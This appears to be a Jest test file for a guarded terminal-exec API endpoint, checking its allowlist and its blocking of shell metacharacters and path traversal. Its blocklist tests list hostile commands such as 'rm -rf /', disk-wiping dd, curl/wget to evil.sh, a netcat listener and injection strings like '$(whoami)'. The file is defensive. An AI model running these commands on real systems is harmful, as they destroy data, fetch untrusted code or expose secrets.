// SPDX-License-Identifier: MIT
jest.mock("../../../utils/middleware/validatedRequest", () => ({
  validatedRequest: (_req, _res, next) => next(),
}));
jest.mock("../../../utils/middleware/simpleRateLimit", () => ({
  simpleRateLimit: () => (_req, _res, next) => next(),
}));
jest.mock("../../../utils/middleware/multiUserProtected", () => ({
  flexUserRoleValid: () => (_req, _res, next) => next(),
  ROLES: { admin: "admin", manager: "manager", default: "default" },
}));
jest.mock("../../../utils/logger", () => () => ({
  error: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
}));

const { createMockApp } = require("../../helpers/mockExpressApp");
const {
  apiTerminalExecEndpoints,
  validateCommand,
} = require("../../../endpoints/api/terminalExec");

function buildApp() {
  const harness = createMockApp();
  apiTerminalExecEndpoints(harness.app);
  return harness;
}

describe("Terminal Exec endpoint", () => {
  const origEnv = process.env.NODE_ENV;
  const origFlag = process.env.ENABLE_TERMINAL_EXEC;

  afterEach(() => {
    jest.clearAllMocks();
    if (origEnv !== undefined) process.env.NODE_ENV = origEnv;
    else delete process.env.NODE_ENV;
    if (origFlag !== undefined) process.env.ENABLE_TERMINAL_EXEC = origFlag;
    else delete process.env.ENABLE_TERMINAL_EXEC;
  });

  describe("security gate", () => {
    it("returns 403 when not in dev mode and flag is unset", async () => {
      process.env.NODE_ENV = "production";
      delete process.env.ENABLE_TERMINAL_EXEC;
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo hello" },
      });
      expect(res.statusCode).toBe(403);
      expect(res.body.error).toMatch(/Terminal execution is disabled/);
    });

    it("allows when ENABLE_TERMINAL_EXEC=true", async () => {
      process.env.NODE_ENV = "production";
      process.env.ENABLE_TERMINAL_EXEC = "true";
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo hello" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.exitCode).toBe(0);
      expect(res.body.stdout.trim()).toBe("hello");
    });

    it("allows in development mode without flag", async () => {
      process.env.NODE_ENV = "development";
      delete process.env.ENABLE_TERMINAL_EXEC;
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo dev" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.stdout.trim()).toBe("dev");
    });
  });

  describe("POST /terminal/exec validation", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    it("rejects a missing command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", { body: {} });
      expect(res.statusCode).toBe(400);
      expect(res.body.error).toMatch(/command is required/);
    });

    it("rejects a blank command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "   " },
      });
      expect(res.statusCode).toBe(400);
    });

    it("rejects a non-string command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: 123 },
      });
      expect(res.statusCode).toBe(400);
    });

    it("rejects an overlong command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "x".repeat(2001) },
      });
      expect(res.statusCode).toBe(400);
      expect(res.body.error).toMatch(/2000 characters/);
    });
  });

  describe("non-whitelisted command blocking", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    const blockedCommands = [
      "rm -rf /",
      "sudo apt update",
      "chmod 777 /etc/passwd",
      "chown -R root /",
      "mkfs.ext4 /dev/sda1",
      "dd if=/dev/zero of=/dev/sda",
      "shutdown -h now",
      "reboot",
      "halt",
      "kill -9 1",
      "killall node",
      "curl http://evil.sh",
      "wget http://evil.sh",
      "bash -c whoami",
      "sh -c id",
      "python -c print(1)",
      "perl -e print",
      "nc -l 4444",
    ];

    for (const cmd of blockedCommands) {
      it(`blocks: ${cmd}`, async () => {
        const { call } = buildApp();
        const res = await call("post", "/terminal/exec", {
          body: { command: cmd },
        });
        expect(res.statusCode).toBe(403);
        expect(res.body.error).toMatch(/not allowed/);
      });
    }
  });

  describe("shell metacharacter blocking", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    const operatorCommands = [
      "echo hello && echo world",
      "echo hello || echo world",
      "echo hello ; echo world",
      "echo hello | cat",
      "echo `whoami`",
      "echo $(whoami)",
      "ls > /tmp/out",
      "cat </etc/passwd",
    ];

    for (const cmd of operatorCommands) {
      it(`blocks: ${cmd}`, async () => {
        const { call } = buildApp();
        const res = await call("post", "/terminal/exec", {
          body: { command: cmd },
        });
        expect(res.statusCode).toBe(403);
      });
    }
  });

  describe("dangerous binaries not in whitelist even with safe args", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    it("blocks node -e code execution", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "node -e process.exit(0)" },
      });
      expect(res.statusCode).toBe(403);
    });

    it("blocks git commands outside the allowlist", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "git push origin main" },
      });
      expect(res.statusCode).toBe(403);
    });
  });

  describe("successful execution", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    it("executes a simple echo command", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo test123" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.exitCode).toBe(0);
      expect(res.body.stdout.trim()).toBe("test123");
      expect(res.body.stderr).toBe("");
    });

    it("allows git status", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "git status" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.exitCode).toBe(0);
    });

    it("respects cwd parameter", async () => {
      const { call } = buildApp();
      const tmpDir = process.env.STORAGE_DIR || process.cwd();
      const res = await call("post", "/terminal/exec", {
        body: { command: "pwd", cwd: tmpDir },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.stdout.trim()).toBe(tmpDir);
    });
  });

  describe("path traversal blocking (regression)", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    it("blocks '..' segments in head arguments", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "head ../../../.env" },
      });
      expect(res.statusCode).toBe(403);
      expect(res.body.error).toMatch(/\.\./);
    });

    it("blocks '..' segments buried mid-path", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "head foo/../../etc/passwd" },
      });
      expect(res.statusCode).toBe(403);
    });

    it("blocks '..' as the cwd parameter", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "pwd", cwd: "../../.." },
      });
      expect(res.statusCode).toBe(400);
      expect(res.body.error).toMatch(/\.\./);
    });

    it("still allows a plain relative filename for head", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "head package.json" },
      });
      expect(res.statusCode).toBe(200);
    });

    it("still allows '.' as ls argument (not a traversal segment)", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "ls ." },
      });
      expect(res.statusCode).toBe(200);
    });
  });

  describe("validateCommand unit tests", () => {
    it("rejects commands not in the whitelist", () => {
      expect(validateCommand("rm", ["-rf", "/"]).ok).toBe(false);
      expect(validateCommand("bash", ["-c", "id"]).ok).toBe(false);
    });

    it("accepts whitelisted commands with valid args", () => {
      expect(validateCommand("echo", ["hello"]).ok).toBe(true);
      expect(validateCommand("ls", ["-la", "/tmp"]).ok).toBe(true);
      expect(validateCommand("pwd", []).ok).toBe(true);
    });

    it("rejects too many arguments", () => {
      expect(validateCommand("pwd", ["extra"]).ok).toBe(false);
    });

    it("rejects shell metacharacters in args", () => {
      expect(validateCommand("echo", ["$(whoami)"]).ok).toBe(false);
      expect(validateCommand("ls", ["`id`"]).ok).toBe(false);
      expect(validateCommand("echo", ["a;b"]).ok).toBe(false);
    });
  });
});
